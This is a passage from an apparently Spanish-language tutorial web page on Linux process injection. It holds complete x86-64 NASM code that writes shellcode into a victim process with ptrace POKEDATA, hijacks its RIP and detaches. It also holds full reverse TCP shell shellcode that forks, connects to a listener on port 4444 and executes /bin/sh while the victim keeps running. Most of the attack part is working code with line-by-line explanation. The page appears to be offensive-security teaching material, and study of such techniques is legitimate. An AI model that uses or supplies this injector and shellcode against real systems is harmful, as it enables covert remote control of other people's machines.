</span><span id="__span-31-20"><a id="__codelineno-31-20" name="__codelineno-31-20" href="#__codelineno-31-20"></a><span class="w">        </span><span class="nf">add</span><span class="w"> </span><span class="nb">r13</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="w">             </span><span class="c1">; Avanzar origen</span>
</span><span id="__span-31-21"><a id="__codelineno-31-21" name="__codelineno-31-21" href="#__codelineno-31-21"></a><span class="w">        </span><span class="nf">dec</span><span class="w"> </span><span class="nb">r14</span><span class="w">                </span><span class="c1">; Decrementar contador</span>
</span><span id="__span-31-22"><a id="__codelineno-31-22" name="__codelineno-31-22" href="#__codelineno-31-22"></a><span class="w">        </span><span class="nf">jmp</span><span class="w"> </span><span class="nv">.loop_inj</span>
</span></code></pre></div>
<p><strong>¿Qué hace?</strong></p>
<p>Copiamos el shellcode a la memoria RWX del proceso víctima, 8 bytes a la vez usando <code>PTRACE_POKEDATA</code> en un bucle.</p>
<p><strong>¿Por qué un bucle?</strong></p>
<p><code>PTRACE_POKEDATA</code> solo puede escribir 8 bytes por llamada. Como nuestro shellcode es más grande, necesitamos múltiples llamadas.</p>
<hr />
<h3 id="finalizacion-y-detach">Finalización y DETACH<a class="headerlink" href="#finalizacion-y-detach" title="Permanent link">&para;</a></h3>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="w">    </span><span class="nl">.done:</span>
</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="w">        </span><span class="nf">pop</span><span class="w"> </span><span class="nb">r12</span><span class="w">                           </span><span class="c1">; Recuperar dirección base</span>
</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>
</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs_ori</span><span class="o">+</span><span class="mh">0x80</span><span class="p">],</span><span class="w"> </span><span class="nb">r12</span><span class="w">    </span><span class="c1">; RIP = inicio del shellcode</span>
</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="kt">qword</span><span class="w"> </span><span class="p">[</span><span class="nv">regs_ori</span><span class="o">+</span><span class="mh">0x78</span><span class="p">],</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="w">     </span><span class="c1">; orig_rax = -1</span>
</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>
</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="w">        </span><span class="c1">; PTRACE_SETREGS - Redirigir al shellcode</span>
</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-32-9"><a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">13</span>
</span><span id="__span-32-10"><a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span>
</span><span id="__span-32-11"><a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
</span><span id="__span-32-12"><a id="__codelineno-32-12" name="__codelineno-32-12" href="#__codelineno-32-12"></a><span class="w">        </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">regs_ori</span><span class="p">]</span>
</span><span id="__span-32-13"><a id="__codelineno-32-13" name="__codelineno-32-13" href="#__codelineno-32-13"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-32-14"><a id="__codelineno-32-14" name="__codelineno-32-14" href="#__codelineno-32-14"></a>
</span><span id="__span-32-15"><a id="__codelineno-32-15" name="__codelineno-32-15" href="#__codelineno-32-15"></a><span class="w">        </span><span class="c1">; PTRACE_DETACH - Liberar proceso</span>
</span><span id="__span-32-16"><a id="__codelineno-32-16" name="__codelineno-32-16" href="#__codelineno-32-16"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">101</span>
</span><span id="__span-32-17"><a id="__codelineno-32-17" name="__codelineno-32-17" href="#__codelineno-32-17"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">17</span>
</span><span id="__span-32-18"><a id="__codelineno-32-18" name="__codelineno-32-18" href="#__codelineno-32-18"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">r15</span>
</span><span id="__span-32-19"><a id="__codelineno-32-19" name="__codelineno-32-19" href="#__codelineno-32-19"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span>
</span><span id="__span-32-20"><a id="__codelineno-32-20" name="__codelineno-32-20" href="#__codelineno-32-20"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="nb">r10</span>
</span><span id="__span-32-21"><a id="__codelineno-32-21" name="__codelineno-32-21" href="#__codelineno-32-21"></a><span class="w">        </span><span class="nf">syscall</span>
</span><span id="__span-32-22"><a id="__codelineno-32-22" name="__codelineno-32-22" href="#__codelineno-32-22"></a>
</span><span id="__span-32-23"><a id="__codelineno-32-23" name="__codelineno-32-23" href="#__codelineno-32-23"></a><span class="w">        </span><span class="c1">; EXIT</span>
</span><span id="__span-32-24"><a id="__codelineno-32-24" name="__codelineno-32-24" href="#__codelineno-32-24"></a><span class="w">        </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">60</span>
</span><span id="__span-32-25"><a id="__codelineno-32-25" name="__codelineno-32-25" href="#__codelineno-32-25"></a><span class="w">        </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">rdi</span>
</span><span id="__span-32-26"><a id="__codelineno-32-26" name="__codelineno-32-26" href="#__codelineno-32-26"></a><span class="w">        </span><span class="nf">syscall</span>
</span></code></pre></div>
<p><strong>¿Qué hace?</strong></p>
<ol>
<li><strong>Modificar RIP</strong>: Cambiamos el RIP para que apunte al inicio de nuestro shellcode.</li>
<li><strong>orig_rax = -1</strong>: Establecemos <code>orig_rax</code> a -1 para evitar que el kernel intente reiniciar una syscall interrumpida.</li>
<li><strong>PTRACE_SETREGS</strong>: Aplicamos estos cambios.</li>
<li><strong>PTRACE_DETACH</strong>: Liberamos el proceso. Este continúa ejecutándose, pero ahora desde nuestro shellcode.</li>
<li><strong>EXIT</strong>: El inyector termina su trabajo.</li>
</ol>
<hr />
<h2 id="shellcode-reverse-tcp-shell-proc_inj_rev_tcpasm">Shellcode: Reverse TCP Shell (proc_inj_rev_tcp.asm)<a class="headerlink" href="#shellcode-reverse-tcp-shell-proc_inj_rev_tcpasm" title="Permanent link">&para;</a></h2>
<p>Este es el shellcode que se inyecta en el proceso víctima:</p>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="k">section</span><span class="w"> </span><span class="nv">.text</span>
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="k">global</span><span class="w"> </span><span class="nv">_start</span>
</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="nl">_start:</span>
</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>
</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>
</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="w">    </span><span class="c1">; FORK</span>
</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">57</span>
</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a>
</span><span id="__span-33-10"><a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a><span class="w">    </span><span class="nf">cmp</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w">           </span><span class="c1">; si rax==0 se trata del hijo</span>
</span><span id="__span-33-11"><a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a><span class="w">    </span><span class="nf">jz</span><span class="w"> </span><span class="nv">.child</span><span class="w">            </span>
</span><span id="__span-33-12"><a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a>
</span><span id="__span-33-13"><a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a><span class="w">                            </span><span class="c1">; r11 porque es un registro clobbered (destruido por las syscalls)</span>
</span><span id="__span-33-14"><a id="__codelineno-33-14" name="__codelineno-33-14" href="#__codelineno-33-14"></a><span class="w">                                </span><span class="c1">; por tanto, no se está modificando un registro funcional del proceso tracee</span>
</span><span id="__span-33-15"><a id="__codelineno-33-15" name="__codelineno-33-15" href="#__codelineno-33-15"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">_start</span><span class="p">]</span><span class="w"> </span><span class="c1">; r11 = dirección de _start = mmap_base = RIP inicial del shellcode</span>
</span><span id="__span-33-16"><a id="__codelineno-33-16" name="__codelineno-33-16" href="#__codelineno-33-16"></a>
</span><span id="__span-33-17"><a id="__codelineno-33-17" name="__codelineno-33-17" href="#__codelineno-33-17"></a>
</span><span id="__span-33-18"><a id="__codelineno-33-18" name="__codelineno-33-18" href="#__codelineno-33-18"></a><span class="w">                            </span><span class="c1">; Nunca se debe asignar un valor a R11 antes de un syscall si se pretende recuperar después</span>
</span><span id="__span-33-19"><a id="__codelineno-33-19" name="__codelineno-33-19" href="#__codelineno-33-19"></a>
</span><span id="__span-33-20"><a id="__codelineno-33-20" name="__codelineno-33-20" href="#__codelineno-33-20"></a><span class="w">    </span><span class="c1">; Proceso Padre</span>
</span><span id="__span-33-21"><a id="__codelineno-33-21" name="__codelineno-33-21" href="#__codelineno-33-21"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">r11</span><span class="o">+</span><span class="mi">4088</span><span class="p">]</span><span class="w"> </span><span class="c1">; Obtiene dirección de retorno</span>
</span><span id="__span-33-22"><a id="__codelineno-33-22" name="__codelineno-33-22" href="#__codelineno-33-22"></a><span class="w">    </span><span class="nf">jmp</span><span class="w"> </span><span class="nb">r14</span><span class="w">             </span><span class="c1">; Salta a la dirección de retorno sobreescribiendo el registro RIP</span>
</span><span id="__span-33-23"><a id="__codelineno-33-23" name="__codelineno-33-23" href="#__codelineno-33-23"></a>
</span><span id="__span-33-24"><a id="__codelineno-33-24" name="__codelineno-33-24" href="#__codelineno-33-24"></a>
</span><span id="__span-33-25"><a id="__codelineno-33-25" name="__codelineno-33-25" href="#__codelineno-33-25"></a><span class="nf">.child</span>
</span><span id="__span-33-26"><a id="__codelineno-33-26" name="__codelineno-33-26" href="#__codelineno-33-26"></a>
</span><span id="__span-33-27"><a id="__codelineno-33-27" name="__codelineno-33-27" href="#__codelineno-33-27"></a>
</span><span id="__span-33-28"><a id="__codelineno-33-28" name="__codelineno-33-28" href="#__codelineno-33-28"></a><span class="w">    </span><span class="c1">; SETSID</span>
</span><span id="__span-33-29"><a id="__codelineno-33-29" name="__codelineno-33-29" href="#__codelineno-33-29"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">112</span>
</span><span id="__span-33-30"><a id="__codelineno-33-30" name="__codelineno-33-30" href="#__codelineno-33-30"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-33-31"><a id="__codelineno-33-31" name="__codelineno-33-31" href="#__codelineno-33-31"></a>
</span><span id="__span-33-32"><a id="__codelineno-33-32" name="__codelineno-33-32" href="#__codelineno-33-32"></a>
</span><span id="__span-33-33"><a id="__codelineno-33-33" name="__codelineno-33-33" href="#__codelineno-33-33"></a><span class="w">    </span><span class="c1">; SOCKET</span>
</span><span id="__span-33-34"><a id="__codelineno-33-34" name="__codelineno-33-34" href="#__codelineno-33-34"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">41</span>
</span><span id="__span-33-35"><a id="__codelineno-33-35" name="__codelineno-33-35" href="#__codelineno-33-35"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="c1">;IPV4</span>
</span><span id="__span-33-36"><a id="__codelineno-33-36" name="__codelineno-33-36" href="#__codelineno-33-36"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="c1">;TCP</span>
</span><span id="__span-33-37"><a id="__codelineno-33-37" name="__codelineno-33-37" href="#__codelineno-33-37"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rdx</span><span class="w"> </span><span class="c1">; Default</span>
</span><span id="__span-33-38"><a id="__codelineno-33-38" name="__codelineno-33-38" href="#__codelineno-33-38"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-33-39"><a id="__codelineno-33-39" name="__codelineno-33-39" href="#__codelineno-33-39"></a>
</span><span id="__span-33-40"><a id="__codelineno-33-40" name="__codelineno-33-40" href="#__codelineno-33-40"></a><span class="w">    </span><span class="c1">; Store socket FD</span>
</span><span id="__span-33-41"><a id="__codelineno-33-41" name="__codelineno-33-41" href="#__codelineno-33-41"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r8</span><span class="p">,</span><span class="w"> </span><span class="nb">rax</span>
</span><span id="__span-33-42"><a id="__codelineno-33-42" name="__codelineno-33-42" href="#__codelineno-33-42"></a>
</span><span id="__span-33-43"><a id="__codelineno-33-43" name="__codelineno-33-43" href="#__codelineno-33-43"></a><span class="w">    </span><span class="c1">; CONNECT</span>
</span><span id="__span-33-44"><a id="__codelineno-33-44" name="__codelineno-33-44" href="#__codelineno-33-44"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">42</span>
</span><span id="__span-33-45"><a id="__codelineno-33-45" name="__codelineno-33-45" href="#__codelineno-33-45"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">r8</span>
</span><span id="__span-33-46"><a id="__codelineno-33-46" name="__codelineno-33-46" href="#__codelineno-33-46"></a><span class="w">                    </span><span class="c1">;   Stack        Low  &lt;----------- High</span>
</span><span id="__span-33-47"><a id="__codelineno-33-47" name="__codelineno-33-47" href="#__codelineno-33-47"></a><span class="w">    </span><span class="c1">; Entrada esperada: 02 00 11 5c C0 A8 12 8D 00 00 00 00 00 00 00 00   </span>
</span><span id="__span-33-48"><a id="__codelineno-33-48" name="__codelineno-33-48" href="#__codelineno-33-48"></a><span class="w">    </span><span class="c1">;                   └──┘  └──┘  └────────┘  └──────────────────────┘</span>
</span><span id="__span-33-49"><a id="__codelineno-33-49" name="__codelineno-33-49" href="#__codelineno-33-49"></a><span class="w">    </span><span class="c1">;                   0-1   2-3   4-7         8-15         (16 bytes en total)</span>
</span><span id="__span-33-50"><a id="__codelineno-33-50" name="__codelineno-33-50" href="#__codelineno-33-50"></a><span class="w">    </span><span class="c1">;                   fam   port  IP          padding</span>
</span><span id="__span-33-51"><a id="__codelineno-33-51" name="__codelineno-33-51" href="#__codelineno-33-51"></a>
</span><span id="__span-33-52"><a id="__codelineno-33-52" name="__codelineno-33-52" href="#__codelineno-33-52"></a><span class="w">    </span><span class="c1">; Mapeado de los campos de sockaddr_in:</span>
</span><span id="__span-33-53"><a id="__codelineno-33-53" name="__codelineno-33-53" href="#__codelineno-33-53"></a><span class="w">                        </span><span class="c1">; Bytes 0-1:   02 00           → sin_family (AF_INET = 2)</span>
</span><span id="__span-33-54"><a id="__codelineno-33-54" name="__codelineno-33-54" href="#__codelineno-33-54"></a><span class="w">                        </span><span class="c1">; Bytes 2-3:   11 5c           → sin_port (4444)</span>
</span><span id="__span-33-55"><a id="__codelineno-33-55" name="__codelineno-33-55" href="#__codelineno-33-55"></a><span class="w">                        </span><span class="c1">; Bytes 4-7:   7F 00 00 01     → sin_addr (127.0.0.1)</span>
</span><span id="__span-33-56"><a id="__codelineno-33-56" name="__codelineno-33-56" href="#__codelineno-33-56"></a><span class="w">                        </span><span class="c1">; Bytes 8-15:  00 00 00 00...  → sin_zero (padding)</span>
</span><span id="__span-33-57"><a id="__codelineno-33-57" name="__codelineno-33-57" href="#__codelineno-33-57"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">r9</span><span class="p">,</span><span class="nb">r9</span><span class="w"> </span><span class="c1">; 0</span>
</span><span id="__span-33-58"><a id="__codelineno-33-58" name="__codelineno-33-58" href="#__codelineno-33-58"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">r9</span><span class="w"> </span><span class="c1">; 64 bits de padding a 0 (sin_zero)(8 bytes)</span>
</span><span id="__span-33-59"><a id="__codelineno-33-59" name="__codelineno-33-59" href="#__codelineno-33-59"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r10</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0100007F5c110002</span>
</span><span id="__span-33-60"><a id="__codelineno-33-60" name="__codelineno-33-60" href="#__codelineno-33-60"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">r10</span><span class="w"> </span><span class="c1">; sin_family + sin_port + sin_addr (8 bytes)</span>
</span><span id="__span-33-61"><a id="__codelineno-33-61" name="__codelineno-33-61" href="#__codelineno-33-61"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span><span class="w"> </span><span class="c1">; direccion del tope de la pila</span>
</span><span id="__span-33-62"><a id="__codelineno-33-62" name="__codelineno-33-62" href="#__codelineno-33-62"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="c1">;IPV4 (espera 16 bytes)</span>
</span><span id="__span-33-63"><a id="__codelineno-33-63" name="__codelineno-33-63" href="#__codelineno-33-63"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-33-64"><a id="__codelineno-33-64" name="__codelineno-33-64" href="#__codelineno-33-64"></a>
</span><span id="__span-33-65"><a id="__codelineno-33-65" name="__codelineno-33-65" href="#__codelineno-33-65"></a>
</span><span id="__span-33-66"><a id="__codelineno-33-66" name="__codelineno-33-66" href="#__codelineno-33-66"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="nb">rsi</span>
</span><span id="__span-33-67"><a id="__codelineno-33-67" name="__codelineno-33-67" href="#__codelineno-33-67"></a><span class="nl">.dup2:</span><span class="w">                        </span><span class="c1">; stdin(0), stdout(1), stderr(2) redirigidos al socket</span>
</span><span id="__span-33-68"><a id="__codelineno-33-68" name="__codelineno-33-68" href="#__codelineno-33-68"></a><span class="w">    </span><span class="c1">;DUP2</span>
</span><span id="__span-33-69"><a id="__codelineno-33-69" name="__codelineno-33-69" href="#__codelineno-33-69"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">33</span>
</span><span id="__span-33-70"><a id="__codelineno-33-70" name="__codelineno-33-70" href="#__codelineno-33-70"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">r8</span>
</span><span id="__span-33-71"><a id="__codelineno-33-71" name="__codelineno-33-71" href="#__codelineno-33-71"></a><span class="w">    </span><span class="nf">syscall</span><span class="w"> </span>
</span><span id="__span-33-72"><a id="__codelineno-33-72" name="__codelineno-33-72" href="#__codelineno-33-72"></a><span class="w">    </span><span class="nf">inc</span><span class="w"> </span><span class="nb">rsi</span>
</span><span id="__span-33-73"><a id="__codelineno-33-73" name="__codelineno-33-73" href="#__codelineno-33-73"></a><span class="w">    </span><span class="nf">cmp</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span>
</span><span id="__span-33-74"><a id="__codelineno-33-74" name="__codelineno-33-74" href="#__codelineno-33-74"></a><span class="w">    </span><span class="nf">jl</span><span class="w"> </span><span class="nv">.dup2</span>
</span><span id="__span-33-75"><a id="__codelineno-33-75" name="__codelineno-33-75" href="#__codelineno-33-75"></a>
</span><span id="__span-33-76"><a id="__codelineno-33-76" name="__codelineno-33-76" href="#__codelineno-33-76"></a><span class="w">    </span><span class="c1">; EXEXCVE</span>
</span><span id="__span-33-77"><a id="__codelineno-33-77" name="__codelineno-33-77" href="#__codelineno-33-77"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">59</span>
</span><span id="__span-33-78"><a id="__codelineno-33-78" name="__codelineno-33-78" href="#__codelineno-33-78"></a>
</span><span id="__span-33-79"><a id="__codelineno-33-79" name="__codelineno-33-79" href="#__codelineno-33-79"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">0</span><span class="w">                       </span><span class="c1">; null terminator de /bin/sh -&gt; /bin/sh\0</span>
</span><span id="__span-33-80"><a id="__codelineno-33-80" name="__codelineno-33-80" href="#__codelineno-33-80"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r12</span><span class="p">,</span><span class="w"> </span><span class="mh">0x68732f6e69622f</span><span class="w">    </span><span class="c1">; /bin/sh (2F 62 69 6E 2F 73 68) en little-endian</span>
</span><span id="__span-33-81"><a id="__codelineno-33-81" name="__codelineno-33-81" href="#__codelineno-33-81"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="nb">r12</span><span class="w">                     </span><span class="c1">; string /bin/sh</span>
</span><span id="__span-33-82"><a id="__codelineno-33-82" name="__codelineno-33-82" href="#__codelineno-33-82"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span>
</span><span id="__span-33-83"><a id="__codelineno-33-83" name="__codelineno-33-83" href="#__codelineno-33-83"></a>
</span><span id="__span-33-84"><a id="__codelineno-33-84" name="__codelineno-33-84" href="#__codelineno-33-84"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">0</span><span class="w">                       </span><span class="c1">; argv = {NULL}</span>
</span><span id="__span-33-85"><a id="__codelineno-33-85" name="__codelineno-33-85" href="#__codelineno-33-85"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rsi</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span>
</span><span id="__span-33-86"><a id="__codelineno-33-86" name="__codelineno-33-86" href="#__codelineno-33-86"></a>
</span><span id="__span-33-87"><a id="__codelineno-33-87" name="__codelineno-33-87" href="#__codelineno-33-87"></a><span class="w">    </span><span class="nf">push</span><span class="w"> </span><span class="mi">0</span><span class="w">                       </span><span class="c1">; envp = {NULL}</span>
</span><span id="__span-33-88"><a id="__codelineno-33-88" name="__codelineno-33-88" href="#__codelineno-33-88"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rdx</span><span class="p">,</span><span class="w"> </span><span class="nb">rsp</span>
</span><span id="__span-33-89"><a id="__codelineno-33-89" name="__codelineno-33-89" href="#__codelineno-33-89"></a>
</span><span id="__span-33-90"><a id="__codelineno-33-90" name="__codelineno-33-90" href="#__codelineno-33-90"></a><span class="w">    </span><span class="nf">syscall</span><span class="w"> </span>
</span><span id="__span-33-91"><a id="__codelineno-33-91" name="__codelineno-33-91" href="#__codelineno-33-91"></a>
</span><span id="__span-33-92"><a id="__codelineno-33-92" name="__codelineno-33-92" href="#__codelineno-33-92"></a><span class="nl">.done:</span>
</span><span id="__span-33-93"><a id="__codelineno-33-93" name="__codelineno-33-93" href="#__codelineno-33-93"></a><span class="w">    </span><span class="c1">; EXIT</span>
</span><span id="__span-33-94"><a id="__codelineno-33-94" name="__codelineno-33-94" href="#__codelineno-33-94"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">60</span><span class="w">                    </span><span class="c1">; syscall: exit</span>
</span><span id="__span-33-95"><a id="__codelineno-33-95" name="__codelineno-33-95" href="#__codelineno-33-95"></a><span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="nb">rdi</span><span class="p">,</span><span class="w"> </span><span class="nb">rdi</span><span class="w">                   </span><span class="c1">; exit code = 0 (éxito)</span>
</span><span id="__span-33-96"><a id="__codelineno-33-96" name="__codelineno-33-96" href="#__codelineno-33-96"></a><span class="w">    </span><span class="nf">syscall</span><span class="w">                        </span>
</span></code></pre></div>
<h3 id="explicacion-del-shellcode">Explicación del shellcode<a class="headerlink" href="#explicacion-del-shellcode" title="Permanent link">&para;</a></h3>
<h4 id="fork-bifurcacion-del-proceso">fork() - Bifurcación del proceso<a class="headerlink" href="#fork-bifurcacion-del-proceso" title="Permanent link">&para;</a></h4>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">57</span>
</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a><span class="w">    </span><span class="nf">syscall</span>
</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a><span class="w">    </span><span class="nf">cmp</span><span class="w"> </span><span class="nb">rax</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a><span class="w">    </span><span class="nf">jz</span><span class="w"> </span><span class="nv">.child</span>
</span></code></pre></div>
<p><strong>¿Por qué fork?</strong></p>
<p>Si ejecutáramos la reverse shell directamente, el proceso víctima quedaría "secuestrado" ejecutando <code>/bin/sh</code> y no podría continuar su trabajo normal. Con fork:</p>
<ul>
<li>El <strong>proceso padre</strong> (la víctima original) puede continuar su ejecución normal.</li>
<li>El <strong>proceso hijo</strong> se encarga de la reverse shell.</li>
</ul>
<h4 id="retorno-del-proceso-padre">Retorno del proceso padre<a class="headerlink" href="#retorno-del-proceso-padre" title="Permanent link">&para;</a></h4>
<div class="language-nasm highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="nb">r11</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="ow">rel</span><span class="w"> </span><span class="nv">_start</span><span class="p">]</span>
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="nb">r14</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="nb">r11</span><span class="o">+</span><span class="mi">4088</span><span class="p">]</span>
</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="w">    </span><span class="nf">jmp</span><span class="w"> </span><span class="nb">r14</span>
</span></code></pre></div>
<p><strong>¿Qué hace?</strong></p>
<ol>
<li>Calcula la dirección base del shellcode usando direccionamiento relativo al RIP.</li>
<li>Lee la dirección de retorno que guardamos al final de la página mmap.</li>
<li>Salta a esa dirección, continuando la ejecución normal del programa víctima.</li>
</ol>
